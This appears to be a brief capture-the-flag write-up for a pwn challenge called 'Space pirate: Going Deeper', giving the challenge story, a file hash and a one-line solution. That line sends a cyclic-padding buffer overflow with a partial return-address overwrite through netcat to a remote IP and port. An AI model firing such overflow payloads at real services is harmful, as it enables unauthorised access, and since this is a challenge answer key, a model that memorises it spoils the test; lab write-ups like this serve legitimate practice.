# Space pirate: Going Deeper

## CHALLENGE DESCRIPTION
We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. Can you disable the mechanisms and take control of the Admin Panel?

#### SHA-256

174b95412986b0f97717c8aaa27eecfcae69aa3dd83836bd29ff9656d6a801b8

```

echo -en "1\n$(cyclic 85)\x12\x0B\x40" | nc 94.237.51.112 44559
Run this command you get the flag
```
